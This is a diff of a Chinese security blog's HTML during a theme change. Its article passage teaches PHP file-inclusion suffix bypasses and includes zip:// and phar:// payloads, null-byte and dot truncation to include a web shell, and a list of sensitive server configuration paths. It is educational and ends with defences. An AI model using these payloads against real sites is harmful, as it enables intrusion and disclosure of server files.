+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321203837999.png" alt="image-20230321203837999"></p>
 <p><strong>其他绕过方式：</strong></p>
 <p>一些常见的特殊字符URL编码：</p>
-<p><img src="image-20230618164128542.png" alt="image-20230618164128542"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230618164128542.png" alt="image-20230618164128542"></p>
 <p>这里可以用burp爆破一遍，看哪个能用</p>
-<h4 id="4-2-2-利用协议">4.2.2 利用协议</h4>
+<h4 id="422-利用协议">4.2.2 利用协议</h4>
 <p><strong>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">zip://
+<pre><code class="hljs plaintext">zip://
 
     [访问参数] ?file=zip://D:\zip.jpg%23phpinfo
     [拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt
@@ -910,18 +582,18 @@ copy  1.jpg/b+2.php  3.jpg
 phar://
 
     [访问参数] ?file=phar://zip.zip/phpinfo
-    [拼接后]  ?file=phar://zip.zip/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    [拼接后]  ?file=phar://zip.zip/phpinfo.txt</code></pre>
 <p><strong>Example：</strong><br>
 <em><em>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码<!--?php phpinfo();?-->)）</em><br>
 所以分别构造payload为：</em>*</p>
-<pre class="line-numbers language-none"><code class="language-none">?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo
+<pre><code class="hljs plaintext">?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo
 
-?file=phar://../../php.zip/phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+?file=phar://../../php.zip/phpinfo</code></pre>
 <p><strong>对应的结果分别为：</strong></p>
-<p><img src="image-20230321204222933.png" alt="image-20230321204222933"></p>
-<p><img src="image-20230321204231560.png" alt="image-20230321204231560"></p>
-<h4 id="4-2-3-长度截断">4.2.3 长度截断</h4>
-<pre class="line-numbers language-none"><code class="language-none">利用条件：
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321204222933.png" alt="image-20230321204222933"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321204231560.png" alt="image-20230321204231560"></p>
+<h4 id="423-长度截断">4.2.3 长度截断</h4>
+<pre><code class="hljs plaintext">利用条件：
 
     php版本&lt;php 5.2.8
 
@@ -932,16 +604,16 @@ phar://
 
 利用方法：
 
-    只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">?file=shell.php./././。。省略。。
-//指定的后缀的被丢弃，成功包含木马文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+    只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</code></pre>
+<pre><code class="hljs plaintext">?file=shell.php./././。。省略。。
+//指定的后缀的被丢弃，成功包含木马文件</code></pre>
 <p><strong>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</strong></p>
-<h4 id="4-2-4-00截断">4.2.4 %00截断</h4>
-<pre class="line-numbers language-none"><code class="language-none">HP魔术引导介绍
+<h4 id="424-00截断">4.2.4 %00截断</h4>
+<pre><code class="hljs plaintext">HP魔术引导介绍
 
   当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。
-  PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效
+  PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的</code></pre>
+<pre><code class="hljs plaintext">在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效
  
 利用条件：
 
@@ -952,19 +624,19 @@ phar://
 
     直接在文件名的最后加上%00来截断指定的后缀名
       ?file=shell.php%00
-//现阶段%00截断不常用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="4-2-5-点号截断">4.2.5 点号截断</h4>
-<pre class="line-numbers language-none"><code class="language-none">原理：
+//现阶段%00截断不常用</code></pre>
+<h4 id="425-点号截断">4.2.5 点号截断</h4>
+<pre><code class="hljs plaintext">原理：
     windows系统 点号 长于 256，超出的部分会被丢弃；
     linux系统 点号 长于 4096，超出的部分会被丢弃；
 示例：
 http://192.168.100.150/test_include/index.php?page=1.png.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
 
-burp抓包修改即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="4-2-6-双写绕过">4.2.6 双写绕过</h4>
+burp抓包修改即可</code></pre>
+<h4 id="426-双写绕过">4.2.6 双写绕过</h4>
 <p><strong>当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php"，“…/”，只需</strong><br>
 <strong>再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。</strong></p>
-<h4 id="4-2-7-大小写混合绕过">4.2.7 大小写混合绕过</h4>
+<h4 id="427-大小写混合绕过">4.2.7 大小写混合绕过</h4>
 <p><strong>如果在文件包含时，服务器对我们传入的参数没有进行严格过滤，比如没没有对大小写进行过滤，我们可以使用大小写混合进行绕过。</strong></p>
 <h2 id="0x05-漏洞防护">0x05 漏洞防护</h2>
 <p><strong>1、使用str_replace等方法过滤掉危险字符</strong></p>
@@ -973,8 +645,8 @@ burp抓包修改即可<span aria-hidden="true" class="line-numbers-rows"><span><
 <p><strong>4、对上传的文件进行重命名，防止被读取</strong></p>
 <p><strong>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</strong></p>
 <p><strong>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">3）一些常见的敏感信息路径：
+<pre><code class="hljs plaintext">./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。</code></pre>
+<pre><code class="hljs plaintext">3）一些常见的敏感信息路径：
 
 Windows系统：
 
@@ -993,929 +665,459 @@ Linux/Unix系统：
     /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
     /usr/local/app/php5/lib/php.ini // PHP相关配置
     /etc/httpd/conf/httpd.conf // Apache配置文件
-    /etc/my.conf // mysql 配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-                
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/">http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">hybcx</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+    /etc/my.conf // mysql 配置文件</code></pre>
+<div class="article-footer slide-up fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
 </div>
-
-                </div>
-            </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">随缘，看各位佬的心情</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
-        </div>
-    </div>
-
-    
-
-    
-
-    
-
-    
-
-    
-        <style>
-    .valine-card {
-        margin: 1.5rem auto;
-    }
-
-    .valine-card .card-content {
-        padding: 20px 20px 5px 20px;
-    }
-
-    #vcomments textarea {
-        box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
-    }
-
-    #vcomments p {
-        margin: 2px 2px 10px;
-        font-size: 1.05rem;
-        line-height: 1.78rem;
-    }
-
-    #vcomments blockquote p {
-        text-indent: 0.2rem;
-    }
-
-    #vcomments a {
-        padding: 0 2px;
-        color: #4cbf30;
-        font-weight: 500;
-        text-decoration: none;
-    }
-
-    #vcomments img {
-        max-width: 100%;
-        height: auto;
-        cursor: pointer;
-    }
-
-    #vcomments ol li {
-        list-style-type: decimal;
-    }
-
-    #vcomments ol,
-    ul {
-        display: block;
-        padding-left: 2em;
-        word-spacing: 0.05rem;
-    }
-
-    #vcomments ul li,
-    ol li {
-        display: list-item;
-        line-height: 1.8rem;
-        font-size: 1rem;
-    }
-
-    #vcomments ul li {
-        list-style-type: disc;
-    }
-
-    #vcomments ul ul li {
-        list-style-type: circle;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    #vcomments table, th, td {
-        border: 0;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments h1 {
-        font-size: 1.85rem;
-        font-weight: bold;
-        line-height: 2.2rem;
-    }
-
-    #vcomments h2 {
-        font-size: 1.65rem;
-        font-weight: bold;
-        line-height: 1.9rem;
-    }
-
-    #vcomments h3 {
-        font-size: 1.45rem;
-        font-weight: bold;
-        line-height: 1.7rem;
-    }
-
-    #vcomments h4 {
-        font-size: 1.25rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    #vcomments h5 {
-        font-size: 1.1rem;
-        font-weight: bold;
-        line-height: 1.4rem;
-    }
-
-    #vcomments h6 {
-        font-size: 1rem;
-        line-height: 1.3rem;
-    }
-
-    #vcomments p {
-        font-size: 1rem;
-        line-height: 1.5rem;
-    }
-
-    #vcomments hr {
-        margin: 12px 0;
-        border: 0;
-        border-top: 1px solid #ccc;
-    }
-
-    #vcomments blockquote {
-        margin: 15px 0;
-        border-left: 5px solid #42b983;
-        padding: 1rem 0.8rem 0.3rem 0.8rem;
-        color: #666;
-        background-color: rgba(66, 185, 131, .1);
-    }
-
-    #vcomments pre {
-        font-family: monospace, monospace;
-        padding: 1.2em;
-        margin: .5em 0;
-        background: #272822;
-        overflow: auto;
-        border-radius: 0.3em;
-        tab-size: 4;
-    }
-
-    #vcomments code {
-        font-family: monospace, monospace;
-        padding: 1px 3px;
-        font-size: 0.92rem;
-        color: #e96900;
-        background-color: #f8f8f8;
-        border-radius: 2px;
-    }
-
-    #vcomments pre code {
-        font-family: monospace, monospace;
-        padding: 0;
-        color: #e8eaf6;
-        background-color: #272822;
-    }
-
-    #vcomments pre[class*="language-"] {
-        padding: 1.2em;
-        margin: .5em 0;
-    }
-
-    #vcomments code[class*="language-"],
-    pre[class*="language-"] {
-        color: #e8eaf6;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-
-    #vcomments b,
-    strong {
-        font-weight: bold;
-    }
-
-    #vcomments dfn {
-        font-style: italic;
-    }
-
-    #vcomments small {
-        font-size: 85%;
-    }
-
-    #vcomments cite {
-        font-style: normal;
-    }
-
-    #vcomments mark {
-        background-color: #fcf8e3;
-        padding: .2em;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-</style>
-
-<div class="card valine-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="vcomments" class="card-content" style="display: grid">
-    </div>
-</div>
-
-<script src="/libs/valine/av-min.js"></script>
-<script src="/libs/valine/Valine.min.js"></script>
-<script>
-    new Valine({
-        el: '#vcomments',
-        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
-        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
-        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
-        notify: 'false' === 'true',
-        verify: 'false' === 'true',
-        visitor: 'false' === 'true',
-        avatar: 'mm',
-        pageSize: '10',
-        lang: 'zh-cn',
-        placeholder: 'just go go'
-    });
-</script>
-
-<!--酷Q推送-->
-
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="浅析文件操作漏洞">
-                        
-                        <span class="card-title">浅析文件操作漏洞</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-07
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    常见top漏洞
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/08/07/qian-xi-xss-lou-dong/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="浅析XSS漏洞">
-                        
-                        <span class="card-title">浅析XSS漏洞</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-07
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    常见top漏洞
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
+    </section>
     </div>
 </article>
+<div class="related-wrap slide-up" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/">浅析文件操作漏洞</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/08/07/qian-xi-xss-lou-dong/">浅析XSS漏洞</a></div></section></div>
 
+<div class="related-wrap slide-up" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2023\07\26\cors-kua-yu-lou-dong\" title="CORS跨域漏洞"><span class="title">CORS跨域漏洞</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text slide-up" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>感谢大佬们的不吝赐教！</p>
+
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+<footer class="page-footer slide-up footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-text">0x01 文件包含的概念：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">1.1 文件包含的原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-text">1.2 文件包含分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-text">1.3 文件包含函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">0x02 PHP伪协议：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-phpinput"><span class="toc-text">2.1 php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-phpfilter"><span class="toc-text">2.2 php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-zip"><span class="toc-text">2.3 zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-data%E4%B8%8Ephar"><span class="toc-text">2.4 data:&#x2F;&#x2F;与phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-expect%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.5 expect:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">0x03 特殊文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E5%8C%85%E5%90%ABapache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">3.1 包含Apache日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E5%8C%85%E5%90%ABssh-log%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">3.2 包含SSH log日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-%E5%8C%85%E5%90%ABenviron"><span class="toc-text">3.3 包含environ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E5%8C%85%E5%90%ABfd"><span class="toc-text">3.4 包含fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-%E5%8C%85%E5%90%ABsession"><span class="toc-text">3.5 包含SESSION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">3.6 包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">3.7 包含上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-%E5%85%B6%E4%BB%96%E5%8C%85%E5%90%AB%E5%A7%BF%E5%8A%BF"><span class="toc-text">3.8 其他包含姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">0x04 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">4.1 指定前缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#411-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">4.1.1 目录遍历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#412-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">4.1.2 编码绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">4.2 指定后缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#421-%E5%88%A9%E7%94%A8url"><span class="toc-text">4.2.1 利用url</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#422-%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">4.2.2 利用协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#423-%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">4.2.3 长度截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#424-00%E6%88%AA%E6%96%AD"><span class="toc-text">4.2.4 %00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#425-%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-text">4.2.5 点号截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#426-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">4.2.6 双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#427-%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-text">4.2.7 大小写混合绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4"><span class="toc-text">0x05 漏洞防护</span></a></li></ol></div><div class="widget-footer">
+
